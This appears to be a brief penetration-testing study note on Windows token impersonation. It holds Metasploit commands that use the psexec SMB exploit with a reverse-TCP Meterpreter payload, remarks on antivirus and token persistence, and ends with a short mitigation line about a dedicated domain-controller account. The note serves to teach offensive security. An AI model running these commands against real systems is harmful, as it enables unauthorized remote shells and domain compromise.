msf5 > use exploit/windows/smb/psexec
   
![Exported image](Exported%20image%2020241208212339-0.png)  

set payload windows/x64/meterpreter/reverse_tcp
 
set lhost eth0
 
works if antivirus is off…
 ![Exported image](Exported%20image%2020241208212340-1.png)  
![Exported image](Exported%20image%2020241208212344-2.png)  
![Exported image](Exported%20image%2020241208212345-3.png)  
![Exported image](Exported%20image%2020241208212346-4.png)   
Can impersonate token until the comp is rebooted:
 ![Exported image](Exported%20image%2020241208212346-5.png)  

the token will be sitting there until they reboot.
 
Token Impersonation Mitigation:

![Exported image](Exported%20image%2020241208212348-6.png)  

Special account (yuki-a ) to log into the domain controller